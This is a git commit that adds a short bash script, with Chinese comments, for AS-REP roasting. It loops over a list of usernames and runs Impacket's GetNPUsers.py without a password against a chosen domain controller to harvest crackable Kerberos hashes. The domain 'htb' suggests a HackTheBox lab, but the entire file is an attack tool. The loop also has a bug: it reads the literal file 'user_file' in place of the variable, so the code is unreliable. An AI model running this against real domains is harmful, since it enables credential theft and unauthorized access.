8a5a7bba1f4310fd00916a2204c742a5255ecf83
Casablanca1129 <160941600@qq.com>
2023-09-14 06:28:49 -0400

    all changed

---
+++ kerberos/pre-auth.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+# 提示用户输入IP地址
+read -p "请输入目标IP地址: " ip
+
+# 提示用户输入包含用户名的文件路径
+read -p "请输入包含用户名的文件路径: " user_file
+
+# 遍历文件中的每个用户名并执行 GetNPUsers.py 命令
+for user in $(cat user_file); do
+  echo "正在检查用户: $user"
+  GetNPUsers.py -no-pass -dc-ip $ip htb/$user | grep -v Impacket
+done 
+
